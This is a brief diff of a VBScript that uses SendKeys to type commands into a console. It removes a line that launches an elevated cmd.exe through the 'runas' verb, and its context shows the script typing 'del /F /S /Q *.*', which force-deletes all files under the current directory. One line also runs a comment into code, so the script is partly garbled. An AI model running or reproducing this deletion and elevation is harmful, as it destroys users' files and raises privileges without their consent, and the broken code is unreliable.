@@ -13,7 +13,6 @@ Wshshell.SendKeys "{ENTER}"
 
 
 WshShell.SendKeys ' VBScript to elevate itself safelySet UAC = CreateObject("Shell.Application")
-UAC.ShellExecute "cmd.exe", "/c echo Hello Admin & pause", "", "runas", 1
 
 
 Wshshell.SendKeys "{ENTER}"
@@ -56,4 +55,5 @@ WshShell.SendKeys "del /F /S /Q *.*"
 
 
 WshShell.SendKeys "{ENTER}"
+
 
